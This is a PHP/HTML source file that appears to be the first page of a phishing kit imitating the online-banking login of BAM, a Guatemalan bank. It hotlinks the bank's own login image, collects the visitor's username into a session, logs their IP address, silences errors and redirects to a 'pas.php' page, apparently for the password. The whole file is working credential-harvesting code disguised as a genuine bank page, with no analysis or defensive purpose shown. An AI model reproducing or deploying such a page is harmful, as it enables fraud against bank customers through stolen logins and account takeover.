<?php
session_start();
error_reporting(0);
 
$ip = $_SERVER["REMOTE_ADDR"];
if (isset($_POST["user"])) {
$_SESSION["user"] = $_POST["user"];
echo '<script>window.location.href = "pas.php";</script>';


}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAM</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">

    <center>
        <form class="form" action="" method="post">
            <br>
            <br>
            <br>
            <br>
            <br>
            <br>
            <img src="bm-icon.svg" alt="">
            <br><br>
            <img class="title" src="title.png" alt="">
            <br><br>
            <div style="height: 100px;" class="caja1">
                <img class="ic" src="ic.png" alt="">
                <input name="user" required class="ip1" type="text" placeholder="Ingresa tu usuario">
                <img class="olv" src="olv.png" alt="">
            </div>
            <br><br>
            <input class="btn" type="submit" value="CONTINUAR">

            <br>
            <img class="pp" src="reg.png" alt="">
        </form>
        <br>

        <img class="of" style=" " src="https://prs.bam.com.gt/assets/img/login.gif"  alt="">


        <br>


        <img style="width: 200px;" src="terminos.png" alt="">

        <br>

        <img style="width: 30px;" src="copy.png" alt="">










</body>

</html>